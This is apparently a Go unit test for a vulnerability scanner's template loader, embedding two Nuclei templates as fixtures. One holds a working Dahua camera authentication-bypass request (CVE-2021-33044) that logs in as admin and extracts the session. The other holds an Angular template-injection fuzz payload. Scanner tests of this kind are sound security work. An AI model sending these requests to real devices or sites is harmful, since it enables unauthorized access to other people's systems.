package tpl

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/EscapeBearSecond/eagleeye/internal/global"
	"github.com/projectdiscovery/nuclei/v3/pkg/catalog/disk"
	"github.com/stretchr/testify/assert"
)

func TestLoadWithFileWalk(t *testing.T) {
	assert := assert.New(t)

	tempDir, err := os.MkdirTemp("", "test")
	assert.NoError(err)
	defer os.RemoveAll(tempDir)

	path := filepath.Join(tempDir, "test.yaml")
	{
		err := os.MkdirAll(filepath.Dir(path), 0755)
		assert.NoError(err)
		err = os.WriteFile(path, []byte(`id: CVE-2021-33044

info:
  name: Dahua IPC/VTH/VTO - Authentication Bypass
  author: gy741
  severity: critical
  description: Some Dahua products contain an authentication bypass during the login process. Attackers can bypass device identity authentication by constructing malicious data packets.
  impact: |
    An attacker can gain unauthorized access to the device, potentially compromising the security and privacy of the system.
  remediation: |
    Apply the latest firmware update provided by Dahua to fix the authentication bypass vulnerability.
  reference:
    - https://github.com/dorkerdevil/CVE-2021-33044
    - https://nvd.nist.gov/vuln/detail/CVE-2021-33044
    - https://seclists.org/fulldisclosure/2021/Oct/13
    - https://www.dahuasecurity.com/support/cybersecurity/details/957
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-33044
    cwe-id: CWE-287
    epss-score: 0.29051
    epss-percentile: 0.96446
    cpe: cpe:2.3:o:dahuasecurity:ipc-hum7xxx_firmware:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: dahuasecurity
    product: ipc-hum7xxx_firmware
  tags: cve2021,cve,dahua,auth-bypass,seclists,dahuasecurity

http:
  - raw:
      - |
        POST /RPC2_Login HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/javascript, */*; q=0.01
        Connection: close
        X-Requested-With: XMLHttpRequest
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Origin: {{BaseURL}}
        Referer: {{BaseURL}}

        {"id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard", "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"result":true'
          - 'id'
          - 'params'
          - 'session'
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        group: 1
        regex:
          - ',"result":true,"session":"([a-z]+)"\}'
        part: body
# digest: 4a0a00473045022100969dc816553940d4ba45200da238d7df4503480847dc4729f24dbeea283d51b302203e3bc11853da98fc6f17ca80f318604a3a94eb5fd28376a5c321efee7f7d1358:922c64590222798bb761d5b6d8e72950`), 0644)
		assert.NoError(err)
	}

	path2 := filepath.Join(tempDir, "test2.yaml")
	{
		err := os.MkdirAll(filepath.Dir(path2), 0755)
		assert.NoError(err)
		err = os.WriteFile(path2, []byte(`id: angular-client-side-template-injection

info:
  name: Angular Client-side-template-injection
  author: theamanrawat
  severity: high
  description: |
    Detects Angular client-side template injection vulnerability.
  impact: |
    May lead to remote code execution or sensitive data exposure.
  remediation: |
    Sanitize user inputs and avoid using user-controlled data in template rendering.
  reference:
    - https://www.acunetix.com/vulnerabilities/web/angularjs-client-side-template-injection/
    - https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs
  tags: angular,csti,dast,headless,xss

variables:
  first: "{{rand_int(1000, 9999)}}"
  second: "{{rand_int(1000, 9999)}}"
  result: "{{to_number(first)*to_number(second)}}"

headless:
  - steps:
      - action: navigate
        args:
          url: "{{BaseURL}}"

      - action: waitload

    payloads:
      payload:
        - '{{concat("{{", "{{first}}*{{second}}", "}}")}}'

    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{payload}}"

    matchers:
      - type: word
        part: body
        words:
          - "{{result}}"
# digest: 4a0a00473045022100adfe788d650a997bddf7f4876f1308a9d1ea62d43e7b90abca139f455492d4e902203223d59aac1aa4374770127adface5ccebfd4a4dc8fdfef8b240578bf7b6df72:922c64590222798bb761d5b6d8e72950`), 0644)
		assert.NoError(err)
	}

	global.Init()

	{
		eOptions := global.ExecutorOptions()
		eOptions.Catalog = disk.NewCatalog("./noexist/path")
		result, err := LoadWithFileWalk("./noexist/path", eOptions)
		assert.Error(err)
		assert.Nil(result)
	}

	{
		eOptions := global.ExecutorOptions()
		eOptions.Catalog = disk.NewCatalog(tempDir)
		result, err := LoadWithFileWalk(tempDir, eOptions)
		assert.NoError(err)
		assert.Len(result.Pocs, 1)

		assert.Equal(result.SkipHeadlessSize, 1)
		assert.Equal(result.SkipHeadlessReason, "browser not found")
	}

	{
		eOptions := global.ExecutorOptions()
		eOptions.Browser, _ = global.Browser()
		eOptions.Catalog = disk.NewCatalog(tempDir)
		result, err := LoadWithFileWalk(tempDir, eOptions)
		assert.NoError(err)

		assert.Equal(result.SkipHeadlessSize, 1)
		assert.Equal(result.SkipHeadlessReason, "headless disabled")

		result, err = LoadWithFileWalk(tempDir, eOptions, WithEnableHeadless(true))
		assert.NoError(err)

		assert.Equal(result.SkipHeadlessSize, 0)
		assert.Equal(result.SkipHeadlessReason, "")
	}
}
